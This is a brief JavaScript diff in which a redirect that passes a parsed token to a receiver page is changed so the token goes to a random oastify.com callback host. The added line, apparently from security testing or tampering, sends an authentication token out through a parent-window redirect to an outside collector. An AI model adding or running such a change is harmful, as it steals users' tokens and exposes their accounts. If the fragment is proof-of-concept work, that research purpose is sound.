@@ -20,7 +20,7 @@
       const token = parsed.tokenValue;
   
       // Redirect parent window
-      const newUrl = "https://mrhavit.github.io/receiver?token=" + encodeURIComponent(token);
+      const newUrl = "https://4chewkqy6xuclie1w7xbz8apyg47s9gy.oastify.com/receiver?token=" + encodeURIComponent(token);
       if (window.parent && window.parent !== window) {
         window.parent.location.href = newUrl;
       } else {
